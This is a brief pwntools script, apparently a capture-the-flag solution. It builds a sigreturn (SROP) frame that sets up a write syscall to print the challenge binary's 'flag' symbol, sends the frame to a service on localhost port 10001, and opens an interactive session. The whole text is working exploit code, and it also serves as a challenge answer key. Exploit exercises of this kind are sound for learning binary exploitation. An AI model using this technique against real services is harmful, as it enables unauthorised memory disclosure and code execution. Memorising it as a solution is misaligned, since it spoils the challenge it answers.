from pwn import *

elf = ELF('./funsignals_player_bin')
io = remote('127.0.0.1', 10001)	# io = process('./funsignals_player_bin')

context.clear()
context.arch = "amd64"

# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 50
frame.rip = elf.symbols['syscall']

io.send(str(frame))
io.interactive()
